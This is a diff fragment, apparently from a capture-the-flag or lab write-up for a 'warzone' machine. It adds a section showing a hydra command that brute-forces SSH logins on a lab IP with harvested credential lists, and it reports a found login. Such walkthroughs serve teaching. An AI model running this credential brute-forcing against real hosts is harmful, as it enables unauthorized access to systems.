@@ -129,6 +129,13 @@ To create jar:
 jar cmvf warzone-decrypt.jar crypto/AES.class Other/Obfuscated.class decrypt/Main.class --manifest=META-INF/MANIFEST.MF
 ```
 
-###
+### Get access:
+
+Now, we have decrypted passwords and logins. Don't forget about open ssh port. I used `hydra` to bruteforce ssh login.
+```
+hydra -L logins.txt -P passwords.txt -o found.txt 192.168.88.226 ssh
+```
+FOUND LOGIN FOR commando!
+
 
 ## Post exploitation
